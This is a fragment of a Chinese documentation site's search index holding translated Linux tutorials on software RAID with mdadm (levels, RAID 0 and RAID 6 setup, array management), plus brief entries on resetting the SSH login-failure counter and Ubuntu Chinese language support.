如果你对本文有任何疑问，随时给我们以评论的形式说明。我们期待倾听阁下的心声！","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-How-to-recover-and-rebuild-data-when-the-software-RAID-failure.html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-How-to-recover-and-rebuild-data-when-the-software-RAID-failure.html"},{"title":"如何使用 Mdadm 工具管理软件 RAID","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6463&idtype=aid >`_ 无论你以前有没有使用 RAID 阵列的经验，\n以及是否完成了 此 RAID 系列 的所有教程，\n一旦你在 Linux 中熟悉了 mdadm --manage 命令的使用，管理软件 RAID 将不是很复杂的任务。 在本教程中，我们会再介绍此工具提供的功能，这样当你需要它，就可以派上用场。 RAID 测试方案 在本系列的最后一篇文章中，我们将使用一个简单的 RAID 1（镜像）阵列，\n它由两个 8GB 的磁盘（/dev/sdb 和 /dev/sdc）和一个备用设备（/dev/sdd）来演示，\n但在此使用的方法也适用于其他类型的配置。也就是说，放心去用吧，把这个页面添加到浏览器的书签，然后让我们开始吧。 了解 mdadm 的选项和使用方法 幸运的是，mdadm 有一个内建的 --help 参数来对每个主要的选项提供说明文档。 因此，让我们开始输入: mdadm --manage --help 就会使我们看到 mdadm --manage 能够执行哪些任务： 使用 mdadm 工具来管理 RAID 正如我们在上面的图片看到，管理一个 RAID 阵列可以在任意时间执行以下任务： （重新）将设备添加到阵列中 把设备标记为故障 从阵列中删除故障设备 使用备用设备更换故障设备 先创建部分阵列 停止阵列 标记阵列为 ro（只读）或 rw（读写） 使用 mdadm 工具管理 RAID 设备 需要注意的是，如果用户忽略 --manage 选项，mdadm 默认使用管理模式。请记住这一点，以避免出现最坏的情况。 上图中的高亮文本显示了管理 RAID 的基本语法: mdadm --manage RAID options devices 让我们来演示几个例子。 例1：为 RAID 阵列添加设备 你通常会添加新设备来更换故障的设备，或者使用空闲的分区以便在出现故障时能及时替换: mdadm --manage /dev/md0 --add /dev/sdd1 添加设备到 Raid 阵列 例2：把一个 RAID 设备标记为故障并从阵列中移除 在从逻辑阵列中删除该设备前，这是强制性的步骤，\n然后才能从机器中取出它 - 注意顺序（如果弄错了这些步骤，最终可能会造成实际设备的损害）: mdadm --manage /dev/md0 --fail /dev/sdb1 请注意在前面的例子中，知道如何添加备用设备来自动更换出现故障的磁盘。\n在此之后， 恢复和重建 raid 数据 就开始了： 恢复和重建 raid 数据 一旦设备已被手动标记为故障，你就可以安全地从阵列中删除它: mdadm --manage /dev/md0 --remove /dev/sdb1 例3：重新添加设备，来替代阵列中已经移除的设备 到现在为止，我们有一个工作的 RAID 1 阵列，\n它包含了2个活动的设备：/dev/sdc1 和 /dev/sdd1。\n现在让我们试试重新添加 /dev/sdb1 到/dev/md0: mdadm --manage /dev/md0 --re-add /dev/sdb1 我们会碰到一个错误: mdadm: --re-add for /dev/sdb1 to /dev/md0 is not possible 因为阵列中的磁盘已经达到了最大的数量。\n因此，我们有两个选择: a）将 /dev/sdb1 添加为备用的，如例1； b）从阵列中删除 /dev/sdd1 然后重新添加 /dev/sdb1。 我们选择选项 b），先停止阵列然后重新启动: mdadm --stop /dev/md0### mdadm --assemble /dev/md0 /dev/sdb1 /dev/sdc1 如果上面的命令不能成功添加 /dev/sdb1 到阵列中，使用例1中的命令来完成。 mdadm 能检测到新添加的设备并将其作为备用设备，当添加完成后它会开始重建数据，\n它也被认为是 RAID 中的活动设备： 重建 Raid 的状态 例4：使用特定磁盘更换 RAID 设备 在阵列中使用备用磁盘更换磁盘很简单: mdadm --manage /dev/md0 --replace /dev/sdb1 --with /dev/sdd1 更换 Raid 设备 这会导致 --replace 指定的设备被标记为故障，而 --with 指定的设备添加到 RAID 中来替代它： 检查 Raid 重建状态 例5：标记 RAID 阵列为 ro 或 rw 创建阵列后，你必须在它上面创建一个文件系统并将其挂载到一个目录下才能使用它。\n你可能不知道，RAID 也可以被设置为 ro，使其只读；或者设置为 rw，就可以同时写入了。 要标记该设备为 ro，首先需要将其卸载: umount /mnt/raid1### mdadm --manage /dev/md0 --readonly### mount /mnt/raid1### touch /mnt/raid1/test1 在 RAID 阵列上设置权限 要配置阵列允许写入操作需要使用 --readwrite 选项。请注意，在设置 rw 标志前，你需要先卸载设备并停止它: umount /mnt/raid1### mdadm --manage /dev/md0 --stop### mdadm --assemble /dev/md0 /dev/sdc1 /dev/sdd1### mdadm --manage /dev/md0 --readwrite### touch /mnt/raid1/test2 配置 Raid 允许读写操作 总结 在本系列中，我们已经解释了如何建立一个在企业环境中使用的软件 RAID 阵列。\n如果你按照这些文章所提供的例子进行配置，在 Linux 中你会充分领会到软件 RAID 的价值。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-How-to-use-MDADM-tool-management-software-RAID.html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-How-to-use-MDADM-tool-management-software-RAID.html"},{"title":"安装 RAID 6 (条带化双分布式奇偶校验)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6121&idtype=aid >`_ RAID 6 是 RAID 5 的升级版，它有两个分布式奇偶校验，即使两个磁盘发生故障后依然有容错能力。\n在两个磁盘同时发生故障时，系统的关键任务仍然能运行。\n它与 RAID 5 相似，但性能更健壮，因为它多用了一个磁盘来进行奇偶校验。 在之前的文章中，我们已经在 RAID 5 看了分布式奇偶校验，但在本文中，我们将看到的是 RAID 6 双分布式奇偶校验。\n不要期望比其他 RAID 有更好的性能，除非你也安装了一个专用的 RAID 控制器。\n在 RAID 6 中，即使我们失去了2个磁盘，我们仍可以通过更换磁盘，从校验中构建数据，然后取回数据。 在 Linux 中安装 RAID 6 要建立一个 RAID 6，一组最少需要4个磁盘。RAID 6 甚至在有些组中会有更多磁盘，\n这样将多个硬盘捆在一起，当读取数据时，它会同时从所有磁盘读取，\n所以读取速度会更快，当写数据时，因为它要将数据写在条带化的多个磁盘上，所以性能会较差。 现在，很多人都在讨论为什么我们需要使用 RAID 6，它的性能和其他 RAID 相比并不太好。\n提出这个问题首先需要知道的是，如果需要高容错性就选择 RAID 6。\n在每一个用于数据库的高可用性要求较高的环境中，\n他们需要 RAID 6 因为数据库是最重要，无论花费多少都需要保护其安全，它在视频流环境中也是非常有用的。 RAID 6 的的优点和缺点 性能不错。 RAID 6 比较昂贵，因为它要求两个独立的磁盘用于奇偶校验功能。 将失去两个磁盘的容量来保存奇偶校验信息（双奇偶校验）。 即使两个磁盘损坏，数据也不会丢失。我们可以在更换损坏的磁盘后从校验中重建数据。 读性能比 RAID 5 更好，因为它从多个磁盘读取，但对于没有专用的 RAID 控制器的设备写性能将非常差。 要求 要创建一个 RAID 6 最少需要4个磁盘。\n你也可以添加更多的磁盘，但你必须有专用的 RAID 控制器。\n使用软件 RAID 我们在 RAID 6 中不会得到更好的性能，所以我们需要一个物理 RAID 控制器。 如果你新接触 RAID 设置，我们建议先看完以下 RAID 文章。 原文: 介绍 RAID 的级别和概念 使用 mdadm 工具创建软件 RAID 0 （条带化） 用两块磁盘创建 RAID 1（镜像） 创建 RAID 5（条带化与分布式奇偶校验） 我的服务器设置: 操作系统    :  CentOS 6.5 Final\nIP 地址     :  192.168.0.228\n主机名      :  rd6.tecmintlocal.com\n磁盘 1 [20GB]  :  /dev/sdb\n磁盘 2 [20GB]  :  /dev/sdc\n磁盘 3 [20GB]  :  /dev/sdd\n磁盘 4 [20GB]  :  /dev/sde 这是9篇系列教程的第5部分，\n在这里我们将看到如何在 Linux 系统或者服务器上使用四个 20GB 的磁盘（名为 /dev/sdb、 /dev/sdc、 /dev/sdd 和 /dev/sde）\n创建和设置软件 RAID 6 （条带化双分布式奇偶校验）。 第1步：安装 mdadm 工具，并检查磁盘 如果你按照我们最进的两篇 RAID 文章（第2篇和第3篇），我们已经展示了如何安装 mdadm 工具。\n如果你直接看的这篇文章，我们先来解释下在 Linux 系统中如何使用 mdadm 工具来创建和管理 RAID，\n首先根据你的 Linux 发行版使用以下命令来安装: yum install mdadm         # [在 RedHat 系统]\napt-get install mdadm     # [在 Debain 系统] 安装该工具后，然后来验证所需的四个磁盘，我们将会使用下面的 fdisk 命令来检查用于创建 RAID 的磁盘: fdisk -l | grep sd 在 Linux 中检查磁盘 在创建 RAID 磁盘前，先检查下我们的磁盘是否创建过 RAID 分区: mdadm -E /dev/sd[b-e]### mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### 或 在磁盘上检查 RAID 分区 注解 在上面的图片中，没有检测到任何 super-block 或者说在四个磁盘上没有 RAID 存在。现在我们开始创建 RAID 6。 第2步：为 RAID 6 创建磁盘分区 现在在 /dev/sdb , /dev/sdc , /dev/sdd 和 /dev/sde 上为 RAID 创建分区，\n使用下面的 fdisk 命令。在这里，我们将展示如何在 sdb 磁盘创建分区，同样的步骤也适用于其他分区。 创建 /dev/sdb 分区: fdisk /dev/sdb 请按照说明进行操作，如下图所示创建分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按回车确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 创建 /dev/sdb 分区* 创建 /dev/sdc 分区: fdisk /dev/sdc 创建 /dev/sdc 分区 创建 /dev/sdd 分区: fdisk /dev/sdd 创建 /dev/sdd 分区 创建 /dev/sde 分区: fdisk /dev/sde 创建 /dev/sde 分区 创建好分区后，检查磁盘的 super-blocks 是个好的习惯。\n如果 super-blocks 不存在我们可以按前面的创建一个新的 RAID: mdadm -E /dev/sd[b-e]1    ### mdadm --examine /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 ### 或 Check Raid on New Partitions, 在新分区中检查 RAID 第3步：创建 md 设备（RAID） 现在可以使用以下命令创建 RAID 设备 md0 （即 /dev/md0），\n并在所有新创建的分区中应用 RAID 级别，然后确认 RAID 设置: mdadm --create /dev/md0 --level=6 --raid-devices=4 /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1\ncat /proc/mdstat 创建 Raid 6 设备 你还可以使用 watch 命令来查看当前创建 RAID 的进程，如下图所示: watch -n1 cat /proc/mdstat 检查 RAID 6 创建过程 使用以下命令验证 RAID 设备: mdadm -E /dev/sd[b-e]1 注解 上述命令将显示四个磁盘的信息，这是相当长的，所以没有截取其完整的输出。 接下来，验证 RAID 阵列，以确认重新同步过程已经开始: mdadm --detail /dev/md0 检查 Raid 6 阵列 第4步：在 RAID 设备上创建文件系统 使用 ext4 为 /dev/md0 创建一个文件系统，并将它挂载在 /mnt/raid6 。\n这里我们使用的是 ext4，但你可以根据你的选择使用任意类型的文件系统: mkfs.ext4 /dev/md0 在 RAID 6 上创建文件系统 将创建的文件系统挂载到 /mnt/raid6，并验证挂载点下的文件，我们可以看到 lost+found 目录: mkdir /mnt/raid6### mount /dev/md0 /mnt/raid6/### ls -l /mnt/raid6/ 在挂载点下创建一些文件，在任意文件中添加一些文字并验证其内容: touch /mnt/raid6/raid6_test.txt\nls -l /mnt/raid6/\necho \"tecmint raid setups\" > /mnt/raid6/raid6_test.txt\ncat /mnt/raid6/raid6_test.txt 验证 RAID 内容 在 /etc/fstab 中添加以下条目使系统启动时自动挂载设备，操作系统环境不同挂载点可能会有所不同: vim /etc/fstab/dev/md0\n/mnt/raid6              ext4    defaults        0 0 自动挂载 RAID 6 设备 接下来，执行 mount -a 命令来验证 fstab 中的条目是否有错误: mount -av 验证 RAID 是否自动挂载 第5步：保存 RAID 6 的配置 请注意，默认情况下 RAID 没有配置文件。\n我们需要使用以下命令手动保存它，然后检查设备 /dev/md0 的状态: mdadm --detail --scan --verbose >> /etc/mdadm.conf\ncat /etc/mdadm.conf\nmdadm --detail /dev/md0 保存 RAID 6 配置 检查 RAID 6 状态 第6步：添加备用磁盘 现在，已经使用了4个磁盘，并且其中两个作为奇偶校验信息来使用。\n在某些情况下，如果任意一个磁盘出现故障，我们仍可以得到数据，因为在 RAID 6 使用双奇偶校验。 如果第二个磁盘也出现故障，在第三块磁盘损坏前我们可以添加一个新的。\n可以在创建 RAID 集时加入一个备用磁盘，但我在创建 RAID 集合前没有定义备用的磁盘。\n不过，我们可以在磁盘损坏后或者创建 RAID 集合时添加一块备用磁盘。\n现在，我们已经创建好了 RAID，下面让我演示如何添加备用磁盘。 为了达到演示的目的，我已经热插入了一个新的 HDD 磁盘（即 /dev/sdf），让我们来验证接入的磁盘: ls -l /dev/ | grep sd 检查新磁盘 现在再次确认新连接的磁盘没有配置过 RAID ，使用 mdadm 来检查: mdadm --examine /dev/sdf 在新磁盘中检查 RAID 像往常一样，我们早前已经为四个磁盘创建了分区，同样，我们使用 fdisk 命令为新插入的磁盘创建新分区: fdisk /dev/sdf 为 /dev/sdf 创建分区 在 /dev/sdf 创建新的分区后，在新分区上确认没有 RAID，\n然后将备用磁盘添加到 RAID 设备 /dev/md0 中，并验证添加的设备: mdadm --examine /dev/sdf\nmdadm --examine /dev/sdf1\nmdadm --add /dev/md0 /dev/sdf1\nmdadm --detail /dev/md0 在 sdf 分区上验证 Raid Add sdf Partition to Raid, 添加 sdf 分区到 RAID 验证 sdf 分区信息 第7步：检查 RAID 6 容错 现在，让我们检查备用驱动器是否能自动工作，当我们阵列中的任何一个磁盘出现故障时。\n为了测试，我将一个磁盘手工标记为故障设备。 在这里，我们标记 /dev/sdd1 为故障磁盘: mdadm --manage --fail /dev/md0 /dev/sdd1 检查 RAID 6 容错 让我们查看 RAID 的详细信息，并检查备用磁盘是否开始同步: mdadm --detail /dev/md0 检查 RAID 自动同步 这里，我们看到备用磁盘激活了，并开始重建进程。\n在底部，我们可以看到有故障的磁盘 /dev/sdd1 标记为 faulty。可以使用下面的命令查看进程重建: cat /proc/mdstat RAID 6 自动同步","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-Install-RAID-6-(strip--based-dual-distributed-puppet-verification).html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-Install-RAID-6-(strip--based-dual-distributed-puppet-verification).html"},{"title":"RAID 的级别和概念","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 评论: https://linux.cn/portal.php?mod=comment&id=6085&idtype=aid RAID 的意思是廉价磁盘冗余阵列（Redundant Array of Inexpensive Disks），\n但现在它被称为独立磁盘冗余阵列（Redundant Array of Independent Drives）。\n早先一个容量很小的磁盘都是非常昂贵的，但是现在我们可以很便宜的买到一个更大的磁盘。\nRaid 是一系列放在一起，成为一个逻辑卷的磁盘集合。 在 Linux 中理解 RAID 设置 RAID 包含一组或者一个集合甚至一个阵列。\n使用一组磁盘结合驱动器组成 RAID 阵列或 RAID 集。\n将至少两个磁盘连接到一个 RAID 控制器，而成为一个逻辑卷，也可以将多个驱动器放在一个组中。 一组磁盘只能使用一个 RAID 级别。\n使用 RAID 可以提高服务器的性能。\n不同 RAID 的级别，性能会有所不同。它通过容错和高可用性来保存我们的数据。 这个系列被命名为\"在 Linux 下使用 RAID\"，分为9个部分，包括以下主题： 第1部分: 介绍 RAID 的级别和概念 第2部分: 在Linux中如何设置 RAID0（条带化） 第3部分: 在Linux中如何设置 RAID1（镜像化） 第4部分: 在Linux中如何设置 RAID5（条带化与分布式奇偶校验） 第5部分: 在Linux中如何设置 RAID6（条带双分布式奇偶校验） 第6部分: 在Linux中设置 RAID 10 或1 + 0（嵌套） 第7部分: 扩展现有的 RAID 阵列和删除故障的磁盘 第8部分: 在 RAID 中恢复（重建）损坏的驱动器 第9部分: 在 Linux 中管理 RAID 这是9篇系列教程的第1部分，在这里我们将介绍 RAID 的概念和 RAID 级别，这是在 Linux 中构建 RAID 需要理解的。 软件 RAID 和硬件 RAID 软件 RAID 的性能较低 因为其使用主机的资源。\n需要加载 RAID 软件以从软件 RAID 卷中读取数据。\n在加载 RAID 软件前，操作系统需要引导起来才能加载 RAID 软件。\n在软件 RAID 中无需物理硬件。零成本投资。 硬件 RAID 的性能较高 他们采用 PCI Express 卡物理地提供有专用的 RAID 控制器。\n它不会使用主机资源。\n他们有 NVRAM 用于缓存的读取和写入。\n缓存用于 RAID 重建时，即使出现电源故障，它会使用后备的电池电源保持缓存。\n对于大规模使用是非常昂贵的投资。 重要的 RAID 概念 校验 方式用在 RAID 重建中从校验所保存的信息中重新生成丢失的内容。 RAID 5，RAID 6 基于校验。 条带化 是将切片数据随机存储到多个磁盘。它不会在单个磁盘中保存完整的数据。如果我们使用2个磁盘，则每个磁盘存储我们的一半数据。 镜像 被用于 RAID 1 和 RAID 10。镜像会自动备份数据。在 RAID 1 中，它会保存相同的内容到其他盘上。 热备份 只是我们的服务器上的一个备用驱动器，它可以自动更换发生故障的驱动器。在我们的阵列中，如果任何一个驱动器损坏，热备份驱动器会自动用于重建 RAID。 块 是 RAID 控制器每次读写数据时的最小单位，最小 4KB。通过定义块大小，我们可以增加 I/O 性能。 RAID有不同的级别。在这里，我们仅列出在真实环境下的使用最多的 RAID 级别。 RAID0 = 条带化 RAID1 = 镜像 RAID5 = 单磁盘分布式奇偶校验 RAID6 = 双磁盘分布式奇偶校验 RAID10 = 镜像 + 条带。（嵌套RAID） RAID 在大多数 Linux 发行版上使用名为 mdadm 的软件包进行管理。让我们先对每个 RAID 级别认识一下。 RAID 0 / 条带化 条带化有很好的性能。\n在 RAID 0（条带化）中数据将使用切片的方式被写入到磁盘。\n一半的内容放在一个磁盘上，另一半内容将被写入到另一个磁盘。 假设我们有2个磁盘驱动器，\n例如，如果我们将数据\"TECMINT\"写到逻辑卷中，\n\"T\"将被保存在第一盘中，\"E\"将保存在第二盘，\n'C'将被保存在第一盘，\"M\"将保存在第二盘，它会一直继续此循环过程。\n（LCTT 译注：实际上不可能按字节切片，是按数据块切片的。） 在这种情况下，如果驱动器中的任何一个发生故障，我们就会丢失数据，\n因为一个盘中只有一半的数据，不能用于重建 RAID。\n不过，当比较写入速度和性能时，RAID 0 是非常好的。\n创建 RAID 0（条带化）至少需要2个磁盘。如果你的数据是非常宝贵的，那么不要使用此 RAID 级别。 高性能。 RAID 0 中容量零损失。 零容错。 写和读有很高的性能。 RAID 1 / 镜像化 镜像也有不错的性能。\n镜像可以对我们的数据做一份相同的副本。假设我们有两个2TB的硬盘驱动器，我们总共有4TB，\n但在镜像中，但是放在 RAID 控制器后面的驱动器形成了一个逻辑驱动器，我们只能看到这个逻辑驱动器有2TB。 当我们保存数据时，它将同时写入这两个2TB驱动器中。\n创建 RAID 1（镜像化）最少需要两个驱动器。\n如果发生磁盘故障，我们可以通过更换一个新的磁盘恢复 RAID 。\n如果在 RAID 1 中任何一个磁盘发生故障，\n我们可以从另一个磁盘中获取相同的数据，因为另外的磁盘中也有相同的数据。所以是零数据丢失。 良好的性能。 总容量丢失一半可用空间。 完全容错。 重建会更快。 写性能变慢。 读性能变好。 能用于操作系统和小规模的数据库。 RAID 5 / 分布式奇偶校验 RAID 5 多用于企业级。\nRAID 5 的以分布式奇偶校验的方式工作。\n奇偶校验信息将被用于重建数据。\n它从剩下的正常驱动器上的信息来重建。在驱动器发生故障时，这可以保护我们的数据。 假设我们有4个驱动器，如果一个驱动器发生故障而后我们更换发生故障的驱动器后，\n我们可以从奇偶校验中重建数据到更换的驱动器上。\n奇偶校验信息存储在所有的4个驱动器上，如果我们有4个 1TB 的驱动器。\n奇偶校验信息将被存储在每个驱动器的256G中，而其它768GB是用户自己使用的。\n单个驱动器故障后，RAID 5 依旧正常工作，如果驱动器损坏个数超过1个会导致数据的丢失。 性能卓越 读速度将非常好。 写速度处于平均水准，如果我们不使用硬件 RAID 控制器，写速度缓慢。 从所有驱动器的奇偶校验信息中重建。 完全容错。 1个磁盘空间将用于奇偶校验。 可以被用在文件服务器，Web服务器，非常重要的备份中。 RAID 6 双分布式奇偶校验磁盘 RAID 6 和 RAID 5 相似但它有两个分布式奇偶校验。\n大多用在大数量的阵列中。\n我们最少需要4个驱动器，即使有2个驱动器发生故障，我们依然可以更换新的驱动器后重建数据。 它比 RAID 5 慢，因为它将数据同时写到4个驱动器上。\n当我们使用硬件 RAID 控制器时速度就处于平均水准。\n如果我们有6个的1TB驱动器，4个驱动器将用于数据保存，2个驱动器将用于校验。 性能不佳。 读的性能很好。 如果我们不使用硬件 RAID 控制器写的性能会很差。 从两个奇偶校验驱动器上重建。 完全容错。 2个磁盘空间将用于奇偶校验。 可用于大型阵列。 用于备份和视频流中，用于大规模。 RAID 10 / 镜像+条带 RAID 10 可以被称为1 + 0或0 +1。它将做镜像+条带两个工作。\n在 RAID 10 中首先做镜像然后做条带。在 RAID 01 上首先做条带，然后做镜像。RAID 10 比 01 好。 假设，我们有4个驱动器。当我逻辑卷上写数据时，它会使用镜像和条带的方式将数据保存到4个驱动器上。 如果我在 RAID 10 上写入数据\"TECMINT\"，数据将使用如下方式保存。\n首先将\"T\"同时写入两个磁盘，\"E\"也将同时写入另外两个磁盘，\n所有数据都写入两块磁盘。这样可以将每个数据复制到另外的磁盘。 同时它将使用 RAID 0 方式写入数据，\n遵循将\"T\"写入第一组盘，\"E\"写入第二组盘。再次将\"C\"写入第一组盘，\"M\"到第二组盘。 良好的读写性能。 总容量丢失一半的可用空间。 容错。 从副本数据中快速重建。 由于其高性能和高可用性，常被用于数据库的存储中。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-RAID-level-and-concept.html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-RAID-level-and-concept.html"},{"title":"使用 mdadm 工具创建软件 RAID 0 (条带化)","text":"参考:: 作者: <Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6087&idtype=aid >`_ RAID 即廉价磁盘冗余阵列，其高可用性和可靠性适用于大规模环境中，相比正常使用，数据更需要被保护。\nRAID 是一些磁盘的集合，是包含一个阵列的逻辑卷。驱动器可以组合起来成为一个阵列或称为（组的）集合。 创建 RAID 最少应使用2个连接到 RAID 控制器的磁盘组成，来构成逻辑卷，\n可以根据定义的 RAID 级别将更多的驱动器添加到一个阵列中。\n不使用物理硬件创建的 RAID 被称为软件 RAID。软件 RAID 也叫做穷人 RAID。 使用 RAID 的主要目的是为了在发生单点故障时保存数据，\n如果我们使用单个磁盘来存储数据，如果它损坏了，\n那么就没有机会取回我们的数据了，\n为了防止数据丢失我们需要一个容错的方法。\n所以，我们可以使用多个磁盘组成 RAID 阵列。 在 RAID 0 中条带是什么 条带是通过将数据在同时分割到多个磁盘上。\n假设我们有两个磁盘，如果我们将数据保存到该逻辑卷上，它会将数据保存在两个磁盘上。\n使用 RAID 0 是为了获得更好的性能，但是如果驱动器中一个出现故障，我们将不能得到完整的数据。\n因此，使用 RAID 0 不是一种好的做法。唯一的解决办法就是安装有 RAID 0 逻辑卷的操作系统来提高重要文件的安全性。 RAID 0 性能较高。 在 RAID 0 上，空间零浪费。 零容错（如果硬盘中的任何一个发生故障，无法取回数据）。 写和读性能都很好。 要求 创建 RAID 0 允许的最小磁盘数目是2个，但你可以添加更多的磁盘，\n不过数目应该是2，4，6，8等的偶数。\n如果你有一个物理 RAID 卡并且有足够的端口，你可以添加更多磁盘。 在这里，我们没有使用硬件 RAID，此设置只需要软件 RAID。\n如果我们有一个物理硬件 RAID 卡，我们可以从它的功能界面访问它。\n有些主板默认内建 RAID 功能，还可以使用 Ctrl + I 键访问它的界面。 关于 RAID 基本的概念: RAID 的级别和概念 我的服务器设置: - 操作系统  :  CentOS 6.5 FinalIP\n- 地址      :  192.168.0.225\n- 两块盘    :  20 GB each 这是9篇系列教程的第2部分，在这部分，我们将看看如何能够在 Linux 上创建和使用 RAID 0（条带化），以名为 sdb 和 sdc 两个 20GB 的硬盘为例。 第1步：更新系统和安装管理 RAID 的 mdadm 软件 在 Linux 上设置 RAID 0 前，我们先更新一下系统，然后安装 mdadm 包。\nmdadm 是一个小程序，这将使我们能够在Linux下配置和管理 RAID 设备: yum clean all && yum update### yum install mdadm -y 第2步：确认连接了两个 20GB 的硬盘 在创建 RAID 0 前，请务必确认两个硬盘能被检测到，使用下面的命令确认: ls -l /dev | grep sd 一旦检测到新的硬盘驱动器，\n同时检查是否连接的驱动器已经被现有的 RAID 使用，使用下面的 mdadm 命令来查看: mdadm --examine /dev/sd[b-c] 第3步：创建 RAID 分区 现在用 sdb 和 sdc 创建 RAID 的分区，使用 fdisk 命令来创建。\n在这里，我将展示如何创建 sdb 驱动器上的分区: fdisk /dev/sdb 请按照以下说明创建分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来显示创建好的分区。 请按照以下说明将分区创建为 Linux 的 RAID 类型。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按回车确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 注解 请使用上述步骤同样在 sdc 驱动器上创建分区。 创建分区后，验证这两个驱动器是否正确定义 RAID，使用下面的命令: mdadm --examine /dev/sd[b-c]### mdadm --examine /dev/sd[b-c]1 第4步：创建 RAID md 设备 现在使用以下命令创建 md 设备（即 /dev/md0），并选择 RAID 合适的级别: mdadm -C /dev/md0 -l raid0 -n 2 /dev/sd[b-c]1### mdadm --create /dev/md0 --level=stripe --raid-devices=2 /dev/sd[b-c]1 -C – 创建 -l – 级别 -n – RAID 设备数 一旦 md 设备已经建立，使用如下命令可以查看 RAID 级别，设备和阵列的使用状态: cat /proc/mdstat 查看 RAID 级别: mdadm -E /dev/sd[b-c]1 查看 RAID 设备: mdadm --detail /dev/md0 查看 RAID 阵列 第5步：给 RAID 设备创建文件系统 将 RAID 设备 /dev/md0 创建为 ext4 文件系统，并挂载到 /mnt/raid0 下: mkfs.ext4 /dev/md0 在 RAID 设备上创建好 ext4 文件系统后，现在创建一个挂载点（即 /mnt/raid0），并将设备 /dev/md0 挂载在它下: mkdir /mnt/raid0### mount /dev/md0 /mnt/raid0/ 下一步，使用 df 命令验证设备 /dev/md0 是否被挂载在 /mnt/raid0 下: df -h 接下来，在挂载点 /mnt/raid0 下创建一个名为 tecmint.txt 的文件，\n为创建的文件添加一些内容，并查看文件和目录的内容: touch /mnt/raid0/tecmint.txt\necho \"Hi everyone how you doing ?\" > /mnt/raid0/tecmint.txt\ncat /mnt/raid0/tecmint.txt\nls -l /mnt/raid0/ 当你验证挂载点后，就可以将它添加到 /etc/fstab 文件中( 添加设备到 fstab 文件中 ): vim /etc/fstab 添加以下条目，根据你的安装位置和使用文件系统的不同，自行做修改: /dev/md0                /mnt/raid0              ext4    deaults         0 0 使用 mount 命令的 -a 来检查 fstab 的条目是否有误: mount -av 第6步：保存 RAID 配置 最后，保存 RAID 配置到一个文件中，以供将来使用。\n我们再次使用带有 -s (scan) 和 -v (verbose) 选项的 mdadm mdadm -E -s -v >> /etc/mdadm.conf### mdadm --detail --scan --verbose >> /etc/mdadm.conf  ### cat /etc/mdadm.conf 就这样，我们在这里看到，如何通过使用两个硬盘配置具有条带化的 RAID 0 。在接下来的文章中，我们将看到如何设置 RAID 1。 最新评论: - 来自北京的 Chrome 43.0|Windows 7 用户 2015-12-02 12:46.4 赞\n  `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=36536&hash=5522402f>`_\n  `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=36536&aid=6087&idtype=>`_\n  这年头还搞软raid，让硬件生产商如何生活\n\n- `XYJK1002 [Chrome 42.0|Windows 7\\] <https://linux.cn/space/20893/>`_ 2015-10-03 19:139 赞\n  `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=35399&hash=5522402f>`_\n  `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=35399&aid=6087&idtype=>`_\n  讨论的这么激烈。。。\n\n- `linux [Chrome 44.0|Mac 10.10\\] <https://linux.cn/space/1/>`_ 2015-08-28 09:013 赞\n  `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=34761&hash=5522402f>`_\n  `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=34761&aid=6087&idtype=>`_\n  系统崩溃时，输出的数据没准都是错误的，硬件 RAID 卡也无法防范这点。只是避免了在 IO 系统将数据送到 RAID 卡后的错误。\n\n- 来自云南昆明的 Chrome 41.0|Windows 7 用户 2015-08-26 11:274 赞\n  `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=34719&hash=5522402f>`_\n  `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=34719&aid=6087&idtype=>`_\n  以前建 RAID5 时，重启后 /dev/md0 名字就变了，也不知道怎么改回来，后面才知道是 /etc/mdadm.conf 的问题","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-Use-the-MDADM-tool-to-create-software-RAID-0-(strip--cation).html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-Use-the-MDADM-tool-to-create-software-RAID-0-(strip--cation).html"},{"title":"ssh重置计数器","text":"这里是指, 登陆失败时, ssh会统计次数,\n超过时, 会等待一段时间才可以再次继续. 可以使用 PAM_RESET_USER 来重置这个计数器, 以立刻继续使用","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-SSH-reset-counter.html","loc":"/yq-docs-operating-system-linux-question-SSH-reset-counter.html"},{"title":"ubuntu中文支持","text":"方式一: 图形化设置 在 Settings 下找到 Region&Language, 进入后点击 Manage Install Languages, 在\n其中选择汉语即可.\n这里若缺少包后会提示缺少相关语言包, 输入密码下载即可. 方式二: 命令行设置 